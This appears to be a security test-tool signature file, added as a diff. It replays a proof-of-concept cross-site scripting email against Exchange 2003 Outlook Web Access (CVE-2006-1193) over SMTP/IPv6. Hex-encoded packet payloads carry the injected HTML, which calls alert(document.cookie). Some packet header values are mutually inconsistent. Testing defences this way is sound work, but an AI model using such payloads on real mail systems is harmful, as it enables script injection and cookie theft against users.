@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Exchange Server Outlook Web Access Script Injection (IPv6 Version)"/>
+    <EngDesc display="true" value="A script injection vulnerability exists in Microsoft Exchange Servers running Outlook Web Access. The vulnerability is caused by improper sanitization of e-mail messages which contain script code when they are read through Outlook Web Access. A malicious user may exploit this flaw to inject and execute HTML and script code in the security context of the target user's browser session. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Command_Injection"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="SMTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Exchange_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Exchange_Server_2003_SP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060613-22"/>
+    <CVEID display="true" value="CVE-2006-1193"/>
+    <bugtraqID display="true" value="18381"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="64fe7d66bf7bf6136fb46959a5034610"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1220017879"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203707051" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="H">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="45484C4F2031302E322E382E35350D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="4D41494C2046524F4D3A203C706F634070726F6F662E6F662E636F6E636570742E636F6D3E0D0A5243505420544F3A203C74657374407372762E677378343E0D0A444154410D0A46726F6D3A2022706F6322203C706F634070726F6F662E6F662E636F6E636570742E636F6D3E0D0A546F3A203C74657374407372762E677378344031302E322E382E35353E0D0A5375626A6563743A58535320506F630D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A0D0A3C696D6720636F6C6F723D27696E0076616C69642720616C743D274D6F75736520486572652E27206F6E4D6F7573654F7665723D276A6176617363726970743A616C65727428646F63756D656E742E636F6F6B696529273E0D0A2E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="32323020326B537276457863686E67323030332E5372762E47535834204D6963726F736F66742045534D5450204D41494C20536572766963652C2056657273696F6E3A20352E302E323139352E3637313320726561647920617420205765642C203238204A756E20323030362031363A30383A3037202D30343030200D0A3235302D326B537276457863686E67323030332E5372762E475358342048656C6C6F205B31302E322E312E36305D0D0A3235302D5455524E0D0A3235302D4154524E0D0A3235302D53495A450D0A3235302D4554524E0D0A3235302D504950454C494E494E470D0A3235302D44534E0D0A3235302D454E48414E434544535441545553434F4445530D0A3235302D386269746D696D650D0A3235302D42494E4152594D494D450D0A3235302D4348554E4B494E470D0A3235302D565246590D0A3235302D582D4558505320475353415049204E544C4D204C4F47494E0D0A3235302D582D455850533D4C4F47494E0D0A3235302D4155544820475353415049204E544C4D204C4F47494E0D0A3235302D415554483D4C4F47494E0D0A3235302D582D4C494E4B3253544154450D0A3235302D584558434835300D0A323530204F4B0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
